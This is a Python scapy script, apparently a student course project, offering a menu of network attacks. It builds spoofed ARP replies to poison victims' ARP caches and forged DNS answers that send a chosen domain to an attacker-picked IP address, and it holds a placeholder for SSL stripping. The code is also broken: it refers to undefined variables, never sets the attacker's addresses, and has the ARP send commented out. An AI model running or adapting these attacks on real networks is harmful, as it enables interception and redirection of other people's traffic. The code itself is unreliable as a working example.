import sys, os, argparse 
from util import bcolors, clear, parse_ip_input, validate_domain
import scapy
from scapy.all import *


# The name of the network interface to use for sniffing and sending packets
INTERFACE_NAME = "enp0s3"
ATTACKS = {
    'a': 'ARP poisoning',
    'b': 'DNS spoofing',
    'c': 'SSL stripping'
}

IP_ATTACKER = ''
MAC_ATTACKER = ''
IP_VICTIMS = []
MAC_VICTIMS = []


# Set up argument parser for using arguments in the command line
parser = argparse.ArgumentParser(
    prog='2IC80 tool',
    description='A tool for ARP poising, DNS spoofing and SSL stripping.',
    epilog='There are no arguments, please use the menu provided when running the tool. Good luck!'
)


def ARPposioning():
    IP_ATTACKER = input("Enter IP address of attacker: ")
    MAC_ATTACKER = getmacbyip(IP_ATTACKER)

    victimNumber = input('Do you want to spoof one or multiple victims? (1/m)')
    if victimNumber == "1":
        ipVictim= input("Enter IP address of victim: ")
        macVictim= getmacbyip(ipVictim)

        IPS_VICTIMS.append(ipVictim)
        MACS_VICTIMS.append(macVictim)

        ipToSpoof= input("Enter IP address to spoof: ")
        print(ipVictim)
        arp=Ether() / ARP()
        arp[Ether].src= macAttacker
        arp[ARP].hwsrc= macAttacker
        arp[ARP].psrc= ipToSpoof
        arp[ARP].hwdst= macVictim
        arp[ARP].pdst= ipVictim
        print("\n\n")
    
    elif victimNumber == "m":   
        IPrange=input('What is the range of IP addresses?')
        IpToSpoof=input('What is the IP address to spoof?')
        if "-" in IPrange:
            upperBoundary=IPrange.split("-")[1]
            lowerBoundary=lowerBoundary=IPrange.split(".")[3].split("-")[0]

            for i in range(int(lowerBoundary), int(upperBoundary)):
                 
                ipVictim= IPrange.split(".")[0]+"."+IPrange.split(".")[1]+"."+IPrange.split(".")[2]+"."+str(i)
                macVictim= getmacbyip(ipVictim)

                IPS_VICTIMS.append(ipVictim)
                MACS_VICTIMS.append(macVictim)

                print(ipVictim)
                arp=Ether() / ARP()
                arp[Ether].src= macAttacker
                arp[ARP].hwsrc= macAttacker
                arp[ARP].psrc= ipToSpoof
                arp[ARP].hwdst= macVictim
                arp[ARP].pdst= ipVictim
        else:
            print("Invalid input. Please try again.")

        print("\n\n")
    

    # sendp(arp, iface=INTERFACE_NAME)
    print(f'{bcolors.OKCYAN}{ATTACKS["a"]}{bcolors.ENDC} has been executed (packet has been succesfully sent)\n')

def DNSpoisoning():
    dns_ip = ''
    dns_domain = ''

    # Ask for a domain until a valid one is provided
    while not dns_domain:
        dns_domain_input = input('Enter the domain name to spoof: ')
        dns_domain_valid = validate_domain(dns_domain_input)

        if dns_domain_valid:
            dns_domain = dns_domain_input
        else:
            print(f'{bcolors.WARNING}Please enter a valid domain (format: www.example.com){bcolors.ENDC}')


    # Ask for an IP address until a valid one is provided
    while not dns_ip:
        dns_ip_input = input('Enter the IP address to redirect the spoofed domain name to: ')
        dns_ip_parsed = parse_ip_input(dns_ip_input)

        if len(dns_ip_parsed) == 1:
            dns_ip = dns_ip_parsed[0]
        else:
            print(f'{bcolors.WARNING}Please fill in a single valid IP address, not a range or list.{bcolors.ENDC}\n')

    # Assumption: ARP poisoning has been applied to make the victim think the attacker is the router (where the DNS lookup message will be sent)
    # The data below is assumed from that ARP poisoning attack
    for ip_victim in IP_VICTIMS:
        dns = Ether() / IP() / UDP() / DNS()
        
        # Set the source and destination MAC and IP addresses (from attacker back to victim)
        dns[Ether].src = MAC_ATTACKER
        dns[Ether].dst = getmacbyip(ip_victim)
        dns[IP].src = IP_ATTACKER
        dns[IP].dst = ip_victim

        # Set the DNS packet's source and destination port to 53, the DNS port
        dns[UDP].sport = 53
        dns[UDP].dport = 53

        dns[DNS].id = random.randint(0, 65535)                # Set the DNS packet's transaction ID to a random number
        dns[DNS].qd = DNSQR(qname=dns_domain)                 # Set the DNS packet's query to the domain name to be spoofed
        dns[DNS].an = DNSRR(rrname=dns_domain, rdata=dns_ip)  # Set the DNS packet's answer to the IP address of your choice

        # Send the DNS packet
        sendp(dns, iface=INTERFACE_NAME)

    print(f'\n{bcolors.OKCYAN}{ATTACKS["b"]}{bcolors.ENDC} has been executed (sent a packet to victim resolving {bcolors.OKCYAN}{dns_domain}{bcolors.ENDC} to {bcolors.OKCYAN}{dns_ip}{bcolors.ENDC})\n')

def SSLstripping():
    print(f'SSL stripping selected.\n')


def main():
    clear()
    print('2IC80: Tool by G44')
    while True:
        print(f'Select the preferred attack from the list below:\n')
        
        # Render options
        for key in ATTACKS:
            print(f'    {bcolors.OKCYAN}{key}{bcolors.ENDC}) {ATTACKS[key]}')
        print(f'    {bcolors.OKCYAN}d{bcolors.ENDC}) Exit\n')

        name = input(f'\nYour choice: {bcolors.OKCYAN}')
        print(f'{bcolors.ENDC}\n')
        print(f'You have selected {bcolors.OKCYAN}{ATTACKS[name] if name in ATTACKS else name}{bcolors.ENDC}.\n')

        if name == 'd':
            break
        elif name == 'a':
            ARPposioning()
        elif name == 'b':
            DNSpoisoning()
        elif name == 'c':
            SSLstripping()
        else:
            print(f'Invalid input. Please try again.\n')


# Entry point: This part runs when the tool is called from the command line using `python tool.py`. The if-statement is not required, but good practice.
if __name__ == '__main__':
    parser.parse_args()
    main()
